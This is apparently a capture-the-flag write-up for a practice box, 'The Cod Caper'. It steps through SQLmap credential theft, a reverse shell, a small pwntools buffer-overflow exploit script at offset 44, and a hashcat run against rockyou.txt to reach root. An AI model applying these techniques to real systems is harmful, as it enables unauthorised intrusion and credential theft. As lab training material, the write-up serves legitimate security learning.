# The Cod Caper
## Enumeration
+ Enumerated the box using nmap initial custom scan.
+ Found the SSH and apache running.
+ Ran gobuster to enumerate files and directories. 
+ Found `administrator.php`.
+ Checking for SQLi using SQLmap.

## Exploitation
+ SQLmap yielded credentials.
+ Logged into web admin portal to be able to execute commands.
+ Got a reverse shell going, used `find` command and found ssh key and hidden password for user `pingu`.
+ SSHed into user `pingu` usings credentials and private key.
+ Ran linpeas to find a hidden binary at `/opt/secret/root`.
+ Opened binary in `pwndbg`.
+ Run with cyclic output: `r < < (cyclic 50)`.
+ Find the number of characters to reach EIP: `cyclic -l 0x6161616c`.
+ Used pwntools to write following script to crack binary:
```
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func
})
proc.sendline(payload)
proc.interactive()
```
+ Used hashcat to crack password: `hashcat -a 0 -m 1800 hash ../rockyou.txt`.
+ Logged in as root.
